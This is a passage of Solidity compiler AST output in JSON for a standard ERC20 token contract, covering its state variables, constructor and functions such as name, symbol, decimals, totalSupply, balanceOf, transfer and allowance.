                "src": "1212:7:8",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 508,
            "mutability": "mutable",
            "name": "_allowances",
            "nameLocation": "1317:11:8",
            "nodeType": "VariableDeclaration",
            "scope": 994,
            "src": "1245:83:8",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
              "typeString": "mapping(address => mapping(address => uint256))"
            },
            "typeName": {
              "id": 507,
              "keyName": "account",
              "keyNameLocation": "1261:7:8",
              "keyType": {
                "id": 503,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "1253:7:8",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "1245:63:8",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
                "typeString": "mapping(address => mapping(address => uint256))"
              },
              "valueName": "",
              "valueNameLocation": "-1:-1:-1",
              "valueType": {
                "id": 506,
                "keyName": "spender",
                "keyNameLocation": "1288:7:8",
                "keyType": {
                  "id": 504,
                  "name": "address",
                  "nodeType": "ElementaryTypeName",
                  "src": "1280:7:8",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                },
                "nodeType": "Mapping",
                "src": "1272:35:8",
                "typeDescriptions": {
                  "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                  "typeString": "mapping(address => uint256)"
                },
                "valueName": "",
                "valueNameLocation": "-1:-1:-1",
                "valueType": {
                  "id": 505,
                  "name": "uint256",
                  "nodeType": "ElementaryTypeName",
                  "src": "1299:7:8",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  }
                }
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 510,
            "mutability": "mutable",
            "name": "_totalSupply",
            "nameLocation": "1351:12:8",
            "nodeType": "VariableDeclaration",
            "scope": 994,
            "src": "1335:28:8",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 509,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "1335:7:8",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 512,
            "mutability": "mutable",
            "name": "_name",
            "nameLocation": "1385:5:8",
            "nodeType": "VariableDeclaration",
            "scope": 994,
            "src": "1370:20:8",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_string_storage",
              "typeString": "string"
            },
            "typeName": {
              "id": 511,
              "name": "string",
              "nodeType": "ElementaryTypeName",
              "src": "1370:6:8",
              "typeDescriptions": {
                "typeIdentifier": "t_string_storage_ptr",
                "typeString": "string"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 514,
            "mutability": "mutable",
            "name": "_symbol",
            "nameLocation": "1411:7:8",
            "nodeType": "VariableDeclaration",
            "scope": 994,
            "src": "1396:22:8",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_string_storage",
              "typeString": "string"
            },
            "typeName": {
              "id": 513,
              "name": "string",
              "nodeType": "ElementaryTypeName",
              "src": "1396:6:8",
              "typeDescriptions": {
                "typeIdentifier": "t_string_storage_ptr",
                "typeString": "string"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 530,
              "nodeType": "Block",
              "src": "1657:57:8",
              "statements": [
                {
                  "expression": {
                    "id": 524,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 522,
                      "name": "_name",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 512,
                      "src": "1667:5:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_string_storage",
                        "typeString": "string storage ref"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 523,
                      "name": "name_",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 517,
                      "src": "1675:5:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_string_memory_ptr",
                        "typeString": "string memory"
                      }
                    },
                    "src": "1667:13:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage",
                      "typeString": "string storage ref"
                    }
                  },
                  "id": 525,
                  "nodeType": "ExpressionStatement",
                  "src": "1667:13:8"
                },
                {
                  "expression": {
                    "id": 528,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 526,
                      "name": "_symbol",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 514,
                      "src": "1690:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_string_storage",
                        "typeString": "string storage ref"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 527,
                      "name": "symbol_",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 519,
                      "src": "1700:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_string_memory_ptr",
                        "typeString": "string memory"
                      }
                    },
                    "src": "1690:17:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage",
                      "typeString": "string storage ref"
                    }
                  },
                  "id": 529,
                  "nodeType": "ExpressionStatement",
                  "src": "1690:17:8"
                }
              ]
            },
            "documentation": {
              "id": 515,
              "nodeType": "StructuredDocumentation",
              "src": "1425:171:8",
              "text": " @dev Sets the values for {name} and {symbol}.\n All two of these values are immutable: they can only be set once during\n construction."
            },
            "id": 531,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 520,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 517,
                  "mutability": "mutable",
                  "name": "name_",
                  "nameLocation": "1627:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 531,
                  "src": "1613:19:8",
                  "stateVariable": false,
                  "storageLocation": "memory",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 516,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "1613:6:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 519,
                  "mutability": "mutable",
                  "name": "symbol_",
                  "nameLocation": "1648:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 531,
                  "src": "1634:21:8",
                  "stateVariable": false,
                  "storageLocation": "memory",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 518,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "1634:6:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1612:44:8"
            },
            "returnParameters": {
              "id": 521,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1657:0:8"
            },
            "scope": 994,
            "src": "1601:113:8",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "baseFunctions": [
              1085
            ],
            "body": {
              "id": 539,
              "nodeType": "Block",
              "src": "1839:29:8",
              "statements": [
                {
                  "expression": {
                    "id": 537,
                    "name": "_name",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 512,
                    "src": "1856:5:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage",
                      "typeString": "string storage ref"
                    }
                  },
                  "functionReturnParameters": 536,
                  "id": 538,
                  "nodeType": "Return",
                  "src": "1849:12:8"
                }
              ]
            },
            "documentation": {
              "id": 532,
              "nodeType": "StructuredDocumentation",
              "src": "1720:54:8",
              "text": " @dev Returns the name of the token."
            },
            "functionSelector": "06fdde03",
            "id": 540,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "name",
            "nameLocation": "1788:4:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 533,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1792:2:8"
            },
            "returnParameters": {
              "id": 536,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 535,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 540,
                  "src": "1824:13:8",
                  "stateVariable": false,
                  "storageLocation": "memory",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 534,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "1824:6:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1823:15:8"
            },
            "scope": 994,
            "src": "1779:89:8",
            "stateMutability": "view",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1091
            ],
            "body": {
              "id": 548,
              "nodeType": "Block",
              "src": "2043:31:8",
              "statements": [
                {
                  "expression": {
                    "id": 546,
                    "name": "_symbol",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 514,
                    "src": "2060:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage",
                      "typeString": "string storage ref"
                    }
                  },
                  "functionReturnParameters": 545,
                  "id": 547,
                  "nodeType": "Return",
                  "src": "2053:14:8"
                }
              ]
            },
            "documentation": {
              "id": 541,
              "nodeType": "StructuredDocumentation",
              "src": "1874:102:8",
              "text": " @dev Returns the symbol of the token, usually a shorter version of the\n name."
            },
            "functionSelector": "95d89b41",
            "id": 549,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "symbol",
            "nameLocation": "1990:6:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 542,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1996:2:8"
            },
            "returnParameters": {
              "id": 545,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 544,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 549,
                  "src": "2028:13:8",
                  "stateVariable": false,
                  "storageLocation": "memory",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 543,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "2028:6:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "2027:15:8"
            },
            "scope": 994,
            "src": "1981:93:8",
            "stateMutability": "view",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1097
            ],
            "body": {
              "id": 557,
              "nodeType": "Block",
              "src": "2763:26:8",
              "statements": [
                {
                  "expression": {
                    "hexValue": "3138",
                    "id": 555,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "2780:2:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_rational_18_by_1",
                      "typeString": "int_const 18"
                    },
                    "value": "18"
                  },
                  "functionReturnParameters": 554,
                  "id": 556,
                  "nodeType": "Return",
                  "src": "2773:9:8"
                }
              ]
            },
            "documentation": {
              "id": 550,
              "nodeType": "StructuredDocumentation",
              "src": "2080:622:8",
              "text": " @dev Returns the number of decimals used to get its user representation.\n For example, if `decimals` equals `2`, a balance of `505` tokens should\n be displayed to a user as `5.05` (`505 / 10 ** 2`).\n Tokens usually opt for a value of 18, imitating the relationship between\n Ether and Wei. This is the default value returned by this function, unless\n it's overridden.\n NOTE: This information is only used for _display_ purposes: it in\n no way affects any of the arithmetic of the contract, including\n {IERC20-balanceOf} and {IERC20-transfer}."
            },
            "functionSelector": "313ce567",
            "id": 558,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "decimals",
            "nameLocation": "2716:8:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 551,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2724:2:8"
            },
            "returnParameters": {
              "id": 554,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 553,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 558,
                  "src": "2756:5:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint8",
                    "typeString": "uint8"
                  },
                  "typeName": {
                    "id": 552,
                    "name": "uint8",
                    "nodeType": "ElementaryTypeName",
                    "src": "2756:5:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "2755:7:8"
            },
            "scope": 994,
            "src": "2707:82:8",
            "stateMutability": "view",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1021
            ],
            "body": {
              "id": 566,
              "nodeType": "Block",
              "src": "2910:36:8",
              "statements": [
                {
                  "expression": {
                    "id": 564,
                    "name": "_totalSupply",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 510,
                    "src": "2927:12:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 563,
                  "id": 565,
                  "nodeType": "Return",
                  "src": "2920:19:8"
                }
              ]
            },
            "documentation": {
              "id": 559,
              "nodeType": "StructuredDocumentation",
              "src": "2795:49:8",
              "text": " @dev See {IERC20-totalSupply}."
            },
            "functionSelector": "18160ddd",
            "id": 567,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "totalSupply",
            "nameLocation": "2858:11:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 560,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2869:2:8"
            },
            "returnParameters": {
              "id": 563,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 562,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 567,
                  "src": "2901:7:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 561,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "2901:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "2900:9:8"
            },
            "scope": 994,
            "src": "2849:97:8",
            "stateMutability": "view",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1029
            ],
            "body": {
              "id": 579,
              "nodeType": "Block",
              "src": "3078:42:8",
              "statements": [
                {
                  "expression": {
                    "baseExpression": {
                      "id": 575,
                      "name": "_balances",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 502,
                      "src": "3095:9:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                        "typeString": "mapping(address => uint256)"
                      }
                    },
                    "id": 577,
                    "indexExpression": {
                      "id": 576,
                      "name": "account",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 570,
                      "src": "3105:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "isConstant": false,
                    "isLValue": true,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "IndexAccess",
                    "src": "3095:18:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 574,
                  "id": 578,
                  "nodeType": "Return",
                  "src": "3088:25:8"
                }
              ]
            },
            "documentation": {
              "id": 568,
              "nodeType": "StructuredDocumentation",
              "src": "2952:47:8",
              "text": " @dev See {IERC20-balanceOf}."
            },
            "functionSelector": "70a08231",
            "id": 580,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "balanceOf",
            "nameLocation": "3013:9:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 571,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 570,
                  "mutability": "mutable",
                  "name": "account",
                  "nameLocation": "3031:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 580,
                  "src": "3023:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 569,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "3023:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3022:17:8"
            },
            "returnParameters": {
              "id": 574,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 573,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 580,
                  "src": "3069:7:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 572,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "3069:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3068:9:8"
            },
            "scope": 994,
            "src": "3004:116:8",
            "stateMutability": "view",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1039
            ],
            "body": {
              "id": 603,
              "nodeType": "Block",
              "src": "3390:103:8",
              "statements": [
                {
                  "assignments": [
                    591
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 591,
                      "mutability": "mutable",
                      "name": "owner",
                      "nameLocation": "3408:5:8",
                      "nodeType": "VariableDeclaration",
                      "scope": 603,
                      "src": "3400:13:8",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 590,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "3400:7:8",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 594,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 592,
                      "name": "_msgSender",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2977,
                      "src": "3416:10:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                        "typeString": "function () view returns (address)"
                      }
                    },
                    "id": 593,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3416:12:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "3400:28:8"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 596,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 591,
                        "src": "3448:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 597,
                        "name": "to",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 583,
                        "src": "3455:2:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 598,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 585,
                        "src": "3459:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 595,
                      "name": "_transfer",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 724,
                      "src": "3438:9:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 599,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3438:27:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 600,
                  "nodeType": "ExpressionStatement",
                  "src": "3438:27:8"
                },
                {
                  "expression": {
                    "hexValue": "74727565",
                    "id": 601,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "bool",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "3482:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "value": "true"
                  },
                  "functionReturnParameters": 589,
                  "id": 602,
                  "nodeType": "Return",
                  "src": "3475:11:8"
                }
              ]
            },
            "documentation": {
              "id": 581,
              "nodeType": "StructuredDocumentation",
              "src": "3126:184:8",
              "text": " @dev See {IERC20-transfer}.\n Requirements:\n - `to` cannot be the zero address.\n - the caller must have a balance of at least `value`."
            },
            "functionSelector": "a9059cbb",
            "id": 604,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "transfer",
            "nameLocation": "3324:8:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 586,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 583,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "3341:2:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 604,
                  "src": "3333:10:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 582,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "3333:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 585,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "3353:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 604,
                  "src": "3345:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 584,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "3345:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3332:27:8"
            },
            "returnParameters": {
              "id": 589,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 588,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 604,
                  "src": "3384:4:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 587,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "3384:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3383:6:8"
            },
            "scope": 994,
            "src": "3315:178:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1049
            ],
            "body": {
              "id": 620,
              "nodeType": "Block",
              "src": "3640:51:8",
              "statements": [
                {
                  "expression": {
                    "baseExpression": {
                      "baseExpression": {
                        "id": 614,
                        "name": "_allowances",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 508,
                        "src": "3657:11:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
                          "typeString": "mapping(address => mapping(address => uint256))"
                        }
                      },
                      "id": 616,
                      "indexExpression": {
                        "id": 615,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 607,
                        "src": "3669:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": false,
                      "nodeType": "IndexAccess",
                      "src": "3657:18:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                        "typeString": "mapping(address => uint256)"
                      }
                    },
                    "id": 618,
                    "indexExpression": {
                      "id": 617,
                      "name": "spender",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 609,
                      "src": "3676:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "isConstant": false,
                    "isLValue": true,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "IndexAccess",
                    "src": "3657:27:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 613,
                  "id": 619,
                  "nodeType": "Return",
                  "src": "3650:34:8"
                }
              ]
            },
            "documentation": {
              "id": 605,
              "nodeType": "StructuredDocumentation",
              "src": "3499:47:8",
              "text": " @dev See {IERC20-allowance}."
            },
            "functionSelector": "dd62ed3e",
            "id": 621,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "allowance",
            "nameLocation": "3560:9:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 610,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 607,
                  "mutability": "mutable",
                  "name": "owner",
                  "nameLocation": "3578:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 621,
                  "src": "3570:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 606,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "3570:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 609,
                  "mutability": "mutable",
                  "name": "spender",
                  "nameLocation": "3593:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 621,
                  "src": "3585:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 608,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "3585:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3569:32:8"
            },
            "returnParameters": {
              "id": 613,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 612,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 621,
                  "src": "3631:7:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 611,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "3631:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "3630:9:8"
            },
            "scope": 994,
            "src": "3551:140:8",
            "stateMutability": "view",
